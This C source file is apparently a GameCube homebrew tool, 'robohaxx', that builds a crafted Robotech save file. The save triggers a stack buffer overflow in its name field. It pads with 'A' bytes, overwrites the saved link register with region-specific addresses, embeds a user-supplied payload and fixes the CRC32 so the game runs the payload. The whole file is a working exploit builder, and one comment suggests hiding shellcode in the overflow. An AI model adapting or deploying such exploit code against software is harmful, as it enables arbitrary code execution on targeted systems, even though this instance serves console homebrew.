#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "gci.h"
#include "endian_flip.h"
#include "robotech_icon.h"

// public domain CRC32 implementation
// source: https://web.archive.org/web/20171117063855/http://home.thep.lu.se/~bjorn/crc/crc32_simple.c
static uint32_t crc32_for_byte(uint32_t r) {
  for(int j = 0; j < 8; ++j)
    r = (r & 1? 0: (uint32_t)0xEDB88320L) ^ r >> 1;
  return r ^ (uint32_t)0xFF000000L;
}
static uint32_t table[0x100];
static void prepare_crc32_table() {
    for(size_t i = 0; i < 0x100; ++i)
        table[i] = crc32_for_byte(i);
}
static void crc32(const void *data, size_t n_bytes, uint32_t* crc) {
    prepare_crc32_table();
    for(size_t i = 0; i < n_bytes; ++i)
        *crc = table[(uint8_t)*crc ^ ((uint8_t*)data)[i]] ^ *crc >> 8;
}

// !! this entire datatype must not contain any NULL bytes !!
typedef struct _RobohaxxOverflow_t {
    char overflow[0x20C]; // if you did some silly XOR stuff you could probably put shellcode here
    uint32_t r22_to_r31_save[10]; // some registers, if you really need
    uint32_t prev_frame; // previous stack frame, probable junk
    uint32_t lr_save; // the address of code to redirect to
    uint32_t leftover; // corrupt another value, for fun!
} RobohaxxOverflow_t;

#define SAVEGAME_DATA_LENGTH 0x19B8
#define MAX_PAYLOAD_LENGTH SAVEGAME_DATA_LENGTH - 0x8 - sizeof(RobohaxxOverflow_t)

// "structure" of the hacked save
typedef struct _RobohaxxSave_t {
    uint32_t crc32;
    uint32_t length;
    union {
        struct {
            uint8_t unk[0x8];
            RobohaxxOverflow_t name;
            uint8_t payload[MAX_PAYLOAD_LENGTH]; // max save length
        } save;
        uint8_t save_bytes[SAVEGAME_DATA_LENGTH];
    };
} RobohaxxSave_t;

// "structure" of the GCI file as a whole
typedef struct _RobohaxxGCI_t {
    GCIHeader_t header;
    uint8_t icon[0x400];
    uint8_t palette[0x200];
    GCIStrings_t strings;
    RobohaxxSave_t savegame;
} RobohaxxGCI_t;

#define NTSC_TARGET_ADDRESS 0x80E20370
#define PAL_TARGET_ADDRESS  0x80E37750
uint32_t target_address = 0;

static char gamecode[] = "GRBx";
static char maker[] = "6S";
static char save_filename[] = "robohaxx";
static char output_filename_buf[40];

static int print_usage(char *filename) {
    printf("usage: %s [path to payload] [U/E] [optional output path, default 6S-GRBx-A.gci]\n", filename);
    return -1;
}
static int print_error(char *error) {
    fprintf(stderr, "error: %s\n", error);
    return -1;
}

int main(int argc, char **argv) {
    // make sure the compiler didn't fuck up our code
    if (sizeof(RobohaxxGCI_t) != 0x2040)
        return print_error("sizeof(RobohaxxGCI_t) wasn't 0x2040, check your compiler");

    printf("robohaxx GCI builder by InvoxiPlayGames\n"
           "https://github.com/InvoxiPlayGames/robohaxx\n\n");
    if (argc < 3)
        return print_usage(argv[0]);

    // make sure the provided region is correct, and set the target address
    if (strlen(argv[2]) != 1) 
        return print_error("argument too long to be a region");
    if (argv[2][0] == 'E' || argv[2][0] == 'e') {
        target_address = PAL_TARGET_ADDRESS;
        gamecode[3] = 'P';
    }
    else if (argv[2][0] == 'U' || argv[2][0] == 'u') {
        target_address = NTSC_TARGET_ADDRESS;
        gamecode[3] = 'E';
    }
    else
        return print_error("invalid region provided, must be E or U");
    printf("target address: %08x\n", target_address);
    
    
    // read the payload file and get the filesize
    FILE *payload_fp = fopen(argv[1], "rb");
    if (payload_fp == NULL)
        return print_error("payload file could not be opened");
    fseek(payload_fp, 0, SEEK_END);
    long payload_len = ftell(payload_fp);
    fseek(payload_fp, 0, SEEK_SET);
    // we can't have this
    if (payload_len > MAX_PAYLOAD_LENGTH || payload_len < 4)
        return print_error("payload file length must not exceed 6000 bytes");
    
    printf("payload length: %li\n", payload_len);

    // allocate a buffer for the payload and read it
    uint8_t *payload = malloc(payload_len);
    if (payload == NULL)
        return print_error("failed to allocate buffer for payload");
    if (fread(payload, 1, payload_len, payload_fp) < payload_len)
        return print_error("failed to read entire payload into memory");
    fclose(payload_fp);

    // allocate a buffer for our GCI
    RobohaxxGCI_t *gci = malloc(sizeof(RobohaxxGCI_t));
    if (gci == NULL)
        return print_error("failed to allocate buffer for our GCI");
    // whoops! all zeroes
    memset(gci, 0, sizeof(RobohaxxGCI_t));
    
    // set up our GCI header
    memcpy(gci->header.gamecode, gamecode, 4);
    memcpy(gci->header.maker, maker, 2);
    WriteBE8(gci->header.unused_always_ff, 0xFF);
    WriteBE8(gci->header.banner_flags, 0x00);
    strncpy(gci->header.filename, save_filename, sizeof(gci->header.filename));
    WriteBE32(gci->header.file_timestamp, 744494400); // time of first exploitation :)
    WriteBE32(gci->header.image_offset, 0); // our image data comes right after this
    WriteBE8(gci->header.icon_fmt[0], 0); // no banner, only an icon
    WriteBE8(gci->header.anim_speed[0], 0);
    WriteBE8(gci->header.icon_fmt[1], 0x01); // CI8 with single palette
    WriteBE8(gci->header.anim_speed[1], 0x03); // 12 frames (non-animated)
    WriteBE8(gci->header.permissions, 0x04) // the original save can't be copied
    WriteBE8(gci->header.copy_counter, 0);
    WriteBE16(gci->header.first_block, 5); // no idea, original save has 5..?
    WriteBE16(gci->header.num_blocks, 1);
    WriteBE16(gci->header.unused_always_ffff, 0xFFFF);
    WriteBE32(gci->header.strings_offset, 0x600); // strings after image data

    // TODO: make our own fancy image data
    memcpy(gci->icon, icon_data, sizeof(gci->icon));
    memcpy(gci->palette, icon_data + sizeof(gci->icon), sizeof(gci->palette));

    // write out the savegame strings to show in the IPL
    strncpy(gci->strings.game_name, "robohaxx: stackcry", 0x20);
    strncpy(gci->strings.save_name, "exploit payload", 0x20);

    // scream into the stack
    for (int i = 0; i < sizeof(gci->savegame.save.name.overflow); i++)
        gci->savegame.save.name.overflow[i] = 'A';
    // fill the registers and such. unimportant but some payloads may want to make use of these
    for (int i = 0; i < sizeof(gci->savegame.save.name.r22_to_r31_save) / 4; i++)
        WriteBE32(gci->savegame.save.name.r22_to_r31_save[i], 0x42424242 + i);
    WriteBE32(gci->savegame.save.name.prev_frame, 0x43434343);
    // here's the link register, set it to where our payload is in the in-memory save
    WriteBE32(gci->savegame.save.name.lr_save, target_address);
    // now we copy our payload from earlier into the savegame
    memcpy(gci->savegame.save.payload, payload, payload_len);

    // calculate the crc32 and set the length 
    uint32_t crc32_temp = 0;
    crc32(gci->savegame.save_bytes, SAVEGAME_DATA_LENGTH, &crc32_temp);
    WriteBE32(gci->savegame.crc32, crc32_temp);
    WriteBE32(gci->savegame.length, SAVEGAME_DATA_LENGTH);

    printf("prepared savegame with crc32 %08x\n", crc32_temp);

    // output the GCI file
    char *output_filename = output_filename_buf;
    if (argc >= 4)
        output_filename = argv[3];
    else
        snprintf(output_filename_buf, sizeof(output_filename_buf), "%2s-%4s-%s.gci", maker, gamecode, save_filename);
    printf("writing GCI to %s\n", output_filename);

    FILE *gci_fp = fopen(output_filename, "wb+");
    if (gci_fp == NULL)
        return print_error("output file could not be opened");
    if (fwrite(gci, sizeof(RobohaxxGCI_t), 1, gci_fp) < 1)
        return print_error("failed to write to output file");
    fclose(gci_fp);

    printf("successfully written output GCI!\n");

    // clean up and free everything
    free(gci);
    free(payload);
    return 0;
}
